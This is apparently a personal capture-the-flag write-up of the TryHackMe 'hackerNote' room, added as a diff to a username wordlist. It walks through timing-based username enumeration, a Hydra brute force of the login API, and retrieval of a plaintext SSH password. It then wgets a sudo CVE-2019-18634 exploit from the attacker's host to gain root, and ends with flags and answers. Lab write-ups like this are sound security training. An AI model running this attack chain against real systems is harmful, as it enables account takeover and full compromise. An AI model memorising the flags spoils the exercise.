@@ -489,3 +489,494 @@ jamal
 jaman
 james
 james_michael
+
+┌──(witty㉿kali)-[/usr/…/wordlists/seclists/Usernames/Names]
+└─$ sudo python3 hackernote.py /usr/share/seclists/Usernames/Names/j_names.txt
+[*] Valid user found: witty
+[*] Valid user found: james
+
+Yep is the same
+```
+Try to write a script to perform a timing attack.
+If you get stuck, re-read the section on using the timing attack or use an exploit from https://github.com/NinjaJc01/hackerNoteExploits
+How many usernames from the list are valid?
+If you get this wrong, try testing the usernames manually and seeing how quickly they return. If it's more or less instant, they're not valid.
+*1*
+What are/is the valid username(s)?
+*james*
+### Attack Passwords
+Download Task Files
+**Next Step**
+Now that we have a username, we need a password. Because the passwords are hashed with bcrypt and take a noticeable time to verify, bruteforcing with a large wordlist like rockyou is not feasible.
+Fortunately, this webapp has password hints!
+With the username that we found in the last step, we can retrieve the password hint. From this password hint, we can create a wordlist and (more) efficiently bruteforce the user's password.
+**Create your wordlist**
+The password hint is "my favourite colour and my favourite number", so we can get a wordlist of colours and a wordlist of digits and combine them using Hashcat Util's Combinator which will give us every combination of the two wordlists. Using this wordlist, we can then use Hydra to attack the login API route and find the password for the user. Download the attached wordlist files, look at them then combine them using hashcat-util's combinator.
+Hashcat utils can be downloaded from: [https://github.com/hashcat/hashcat-utils/releases](https://github.com/hashcat/hashcat-utils/releases)[](https://github.com/hashcat/hashcat-utils/releases)
+Either add these to your PATH, or run them from the folder.
+We want to use the Combinator.bin binary, with colors.txt and numbers.txt as the input. The command for this is (assuming you're in the directory with the binaries and have copiesd the txt files into that directory):
+./combinator.bin colors.txt numbers.txt > wordlist.txt
+This will then give you a wordlist to use for Hydra.
+**Attack the API**
+The HTTP POST request that we captured earlier tells us enough about the API that we can use Hydra to attack it.
+The API is actually designed to either accept Form data, or JSON data. The frontend sends JSON data as a POST request, so we will use this. Hydra allows attacking HTTP POST requests, with the HTTP-POST module. To use this, we need:
+-   Request Body - JSON
+{"username":"admin","password":"admin"}
+-   Request Path -
+/api/user/login
+-   Error message for incorrect logins -
+"Invalid Username Or Password"
+The command for this is (replace the parts with angle brackets, you will need to escape special characters):
+hydra -l <username> -P <wordlist> 192.168.2.62 http-post-form <path>:<body>:<fail_message>
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/Downloads]
+└─$ unzip wordlists.zip 
+Archive:  wordlists.zip
+ extracting: colors.txt              
+ extracting: numbers.txt
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ unzip hashcat-utils-1.9.zip 
+Archive:  hashcat-utils-1.9.zip
+5f4f35d94b0229c41e61b2fd369c016b71ff9641
+   creating: hashcat-utils-1.9/
+ extracting: hashcat-utils-1.9/.gitignore  
+  inflating: hashcat-utils-1.9/CHANGES  
+  inflating: hashcat-utils-1.9/LICENSE  
+  inflating: hashcat-utils-1.9/README.md  
+   creating: hashcat-utils-1.9/bin/
+ extracting: hashcat-utils-1.9/bin/.hold  
+   creating: hashcat-utils-1.9/src/
+  inflating: hashcat-utils-1.9/src/Makefile  
+  inflating: hashcat-utils-1.9/src/cap2hccapx.c  
+  inflating: hashcat-utils-1.9/src/cleanup-rules.c  
+  inflating: hashcat-utils-1.9/src/combinator.c  
+  inflating: hashcat-utils-1.9/src/combinator3.c  
+  inflating: hashcat-utils-1.9/src/combipow.c  
+  inflating: hashcat-utils-1.9/src/cpu_rules.c  
+  inflating: hashcat-utils-1.9/src/cpu_rules.h  
+  inflating: hashcat-utils-1.9/src/ct3_to_ntlm.c  
+  inflating: hashcat-utils-1.9/src/cutb.c  
+  inflating: hashcat-utils-1.9/src/deskey_to_ntlm.pl  
+  inflating: hashcat-utils-1.9/src/expander.c  
+  inflating: hashcat-utils-1.9/src/gate.c  
+  inflating: hashcat-utils-1.9/src/generate-rules.c  
+  inflating: hashcat-utils-1.9/src/hcstat2gen.c  
+  inflating: hashcat-utils-1.9/src/hcstatgen.c  
+  inflating: hashcat-utils-1.9/src/keyspace.c  
+  inflating: hashcat-utils-1.9/src/len.c  
+  inflating: hashcat-utils-1.9/src/mli2.c  
+  inflating: hashcat-utils-1.9/src/morph.c  
+  inflating: hashcat-utils-1.9/src/permute.c  
+  inflating: hashcat-utils-1.9/src/permute_exist.c  
+  inflating: hashcat-utils-1.9/src/prepare.c  
+  inflating: hashcat-utils-1.9/src/remaining.pl  
+  inflating: hashcat-utils-1.9/src/req-exclude.c  
+  inflating: hashcat-utils-1.9/src/req-include.c  
+  inflating: hashcat-utils-1.9/src/rli.c  
+  inflating: hashcat-utils-1.9/src/rli2.c  
+  inflating: hashcat-utils-1.9/src/rp_cpu.h  
+  inflating: hashcat-utils-1.9/src/rules_optimize.c  
+  inflating: hashcat-utils-1.9/src/seprule.pl  
+  inflating: hashcat-utils-1.9/src/splitlen.c  
+  inflating: hashcat-utils-1.9/src/strip-bsn.c  
+  inflating: hashcat-utils-1.9/src/strip-bsr.c  
+  inflating: hashcat-utils-1.9/src/tmesis-dynamic.pl  
+  inflating: hashcat-utils-1.9/src/tmesis.pl  
+  inflating: hashcat-utils-1.9/src/topmorph.pl  
+  inflating: hashcat-utils-1.9/src/utils.c 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ locate combinator.bin
+/usr/lib/hashcat-utils/combinator.bin
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ /usr/lib/hashcat-utils/combinator.bin colors.txt numbers.txt > wordlist_hackernote
+                                                                                                       
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wc -l wordlist_hackernote 
+180 wordlist_hackernote
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ more wordlist_hackernote 
+amber0
+amber1
+amber2
+amber3
+amber4
+amber5
+amber6
+amber7
+amber8
+amber9
+beige0
+beige1
+beige2
+beige3
+beige4
+beige5
+beige6
+beige7
+beige8
+beige9
+black0
+black1
+black2
+black3
+black4
+black5
+black6
+black7
+black8
+black9
+blue0
+blue1
+blue2
+blue3
+blue4
+blue5
+blue6
+blue7
+blue8
+blue9
+brown0
+brown1
+brown2
+brown3
+brown4
+brown5
+brown6
+brown7
+brown8
+brown9
+crimson0
+crimson1
+crimson2
+crimson3
+crimson4
+crimson5
+crimson6
+crimson7
+crimson8
+crimson9
+cyan0
+cyan1
+cyan2
+cyan3
+cyan4
+cyan5
+cyan6
+cyan7
+cyan8
+cyan9
+gray0
+gray1
+gray2
+gray3
+gray4
+gray5
+gray6
+gray7
+gray8
+gray9
+green0
+green1
+green2
+green3
+green4
+green5
+green6
+green7
+green8
+green9
+indigo0
+indigo1
+indigo2
+indigo3
+indigo4
+indigo5
+indigo6
+indigo7
+indigo8
+indigo9
+magenta0
+magenta1
+magenta2
+magenta3
+magenta4
+magenta5
+magenta6
+magenta7
+magenta8
+magenta9
+orange0
+orange1
+orange2
+orange3
+orange4
+orange5
+orange6
+orange7
+orange8
+orange9
+pink0
+pink1
+pink2
+pink3
+pink4
+pink5
+pink6
+pink7
+pink8
+pink9
+purple0
+purple1
+purple2
+purple3
+purple4
+purple5
+purple6
+purple7
+purple8
+purple9
+red0
+red1
+red2
+red3
+red4
+red5
+red6
+red7
+red8
+red9
+violet0
+violet1
+violet2
+violet3
+violet4
+violet5
+violet6
+violet7
+violet8
+violet9
+white0
+white1
+white2
+white3
+white4
+white5
+white6
+white7
+white8
+white9
+yellow0
+yellow1
+yellow2
+yellow3
+yellow4
+yellow5
+yellow6
+yellow7
+yellow8
+yellow9
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ hydra -l james -P wordlist_hackernote 10.10.247.168 http-post-form "/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password"
+Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 180 login tries (l:1/p:180), ~12 tries per task
+[DATA] attacking http-post-form://10.10.247.168:80/api/user/login:username=^USER^&password=^PASS^:Invalid Username Or Password
+[STATUS] 48.00 tries/min, 48 tries in 00:01h, 132 to do in 00:03h, 16 active
+[80][http-post-form] host: 10.10.247.168   login: james   password: blue7
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
+
+using burp intruder
+
+lenght different 265
+
+HTTP/1.1 200 OK
+
+Content-Type: application/json
+
+Set-Cookie: SessionToken=6481deabea9cee5ddae59dcc34e0f55b; Path=/
+
+Date: Thu, 16 Mar 2023 18:11:55 GMT
+
+Content-Length: 71
+
+Connection: close
+
+{"SessionToken":"6481deabea9cee5ddae59dcc34e0f55b","status":"success"}
+
+after login
+
+HTTP/1.1 200 OK
+
+Content-Type: application/json
+
+Date: Thu, 16 Mar 2023 18:14:37 GMT
+
+Content-Length: 125
+
+Connection: close
+
+[{"noteID":1,"userID":1,"noteTitle":"My SSH details","noteContent":"So that I don't forget, my SSH password is dak4ddb37b"}]
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh james@10.10.247.168       
+The authenticity of host '10.10.247.168 (10.10.247.168)' can't be established.
+ED25519 key fingerprint is SHA256:0Fb40mE1AmcHWbg2H7/8Afq+0Uk5vLB/UrPPvJ9AxLM.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.247.168' (ED25519) to the list of known hosts.
+james@10.10.247.168's password: 
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Mar 16 18:15:43 UTC 2023
+
+  System load:  0.1               Processes:           88
+  Usage of /:   49.2% of 9.78GB   Users logged in:     0
+  Memory usage: 10%               IP address for eth0: 10.10.247.168
+  Swap usage:   0%
+
+59 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Feb 10 11:58:27 2020 from 10.0.2.2
+james@hackernote:~$ id;pwd
+uid=1001(james) gid=1001(james) groups=1001(james)
+/home/james
+james@hackernote:~$ ls
+user.txt
+james@hackernote:~$ cat user.txt
+thm{56911bd7ba1371a3221478aa5c094d68}
+```
+Form the hydra command to attack the login API route
+If you're struggling with JSON, the API route also accepts form data, which is easier to use with Hydra.
+Completed
+How many passwords were in your wordlist?
+wc, look for number of lines
+*180*
+What was the user's password?
+*blue7*
+Login as the user to the platform
+Completed
+What's the user's SSH password?
+*dak4ddb37b*
+Log in as the user to SSH with the credentials you have.
+Completed
+What's the user flag?
+### Escalate
+**Enumeration of privileges**
+Now that you have an SSH session, you can grab the user flag. But that shouldn't be enough for you, you need root.
+A good first step for privilege escalation is seeing if you can run sudo. You have the password for the current user, so you can run the command:
+sudo -l
+This command tells you what commands you can run as the superuser with sudo. Unfortunately, the current user cannot run any commands as root. You may have noticed, however, that when you enter your password you see asterisks. This is not default behaviour. There was a recent CVE released that affects this configuration. The setting is called pwdfeedback.
+Answer the questions below
+
+## Privilege Escalation
+```text
+james@hackernote:~$ sudo -l
+[sudo] password for james: **********
+
+**** CVE
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cd sudo-cve-2019-18634   
+                                                                                     
+┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
+└─$ ls
+exploit  exploit.c  LICENSE  Makefile  README.md
+
+┌──(witty㉿kali)-[~/Downloads/sudo-cve-2019-18634]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.247.168 - - [16/Mar/2023 14:41:29] "GET /exploit HTTP/1.1" 200 -
+
+james@hackernote:~$ cd /tmp
+james@hackernote:/tmp$ wget http://10.8.19.103:1234/exploit
+--  http://10.8.19.103:1234/exploit
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 841784 (822K) [application/octet-stream]
+Saving to: ‘exploit’
+
+exploit           100%[============>] 822.05K   284KB/s    in 2.9s    
+
+(284 KB/s) - ‘exploit’ saved [841784/841784]
+
+james@hackernote:/tmp$ ./exploit
+-bash: ./exploit: Permission denied
+james@hackernote:/tmp$ chmod +x exploit
+james@hackernote:/tmp$ ./exploit 
+[sudo] password for james: 
+Sorry, try again.
+```
+```text
+# whoami
+root
+```
+```text
+# cd /root
+```
+```text
+# ls
+root.txt
+```
+```text
+# cat root.txt
+thm{af55ada6c2445446eb0606b5a2d3a4d2}
+```
+What is the CVE number for the exploit?
+All caps, from 2019.
+*CVE-2019-18634*
+Find the exploit from [https://github.com/saleemrashid/](https://github.com/saleemrashid/)[](https://github.com/saleemrashid/) and download the files.
+Git clone, or download as zip and extract.
+Completed
+Compile the exploit from Kali linux.
+cd into the folder and run "make"
+Completed
+SCP the exploit binary to the box.
+Completed
+Run the exploit, get root.
+Completed
+What is the root flag?
+### Comments on realism and Further Reading
+**Web app**
+This room was designed to be more realistic and less CTF focused. The logic behind the timing attack is mentioned in OWASP's authentication section, and a fairly similar timing attack existed on OpenSSH, allowing username enumeration. I've included links to this in the Further Reading section
+Password hints in webapps are normally considered bad practice, but large companies still often include them. Adobe suffered a large databreach affecting users of Creative Cloud and decryption of the passwords was made much easier due to the password hints also included in the breach.
+**Privilege** **Escalation**
+The privilege escalation for this box is a real world CVE vulnerability, and affected the default configurations of sudo on macOS, Linux Mint and ElementaryOS.
+**Further reading**
+﻿**Timing attacks on logins**[https://seclists.org/fulldisclosure/2016/Jul/51](https://seclists.org/fulldisclosure/2016/Jul/51)
+[https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)[](https://www.gnucitizen.org/blog/username-enumeration-vulnerabilities/)
+[https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002)](https://wiki.owasp.org/index.php/Testing_for_User_Enumeration_and_Guessable_User_Account_(OWASP-AT-002))
+**Adobe Password Breach
+**[https://nakedsecurity.sophos.com//anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/](https://nakedsecurity.sophos.com//anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)
+[](https://nakedsecurity.sophos.com//anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/)
+**Sudo CVE**
+[https://dylankatz.com/Analysis-of-CVE-2019-18634/](https://dylankatz.com/Analysis-of-CVE-2019-18634/)[](https://dylankatz.com/Analysis-of-CVE-2019-18634/)
+[https://nvd.nist.gov/vuln/detail/CVE-2019-18634](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)[](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)
+[https://tryhackme.com/room/sudovulnsbof](https://tryhackme.com/room/sudovulnsbof)
+Answer the questions below
+Read, explore, learn.
+Completed
+
+## Flags / Answers
+- ***thm{56911bd7ba1371a3221478aa5c094d68}***
+- ***thm{af55ada6c2445446eb0606b5a2d3a4d2}***
+
+## Notes / Lessons Learned
+----
+A custom webapp, introducing username enumeration, custom wordlists and a basic privilege escalation exploit.
+---
+![](https://i.imgur.com/52GtMD0.png)
+[[Watcher]]
+
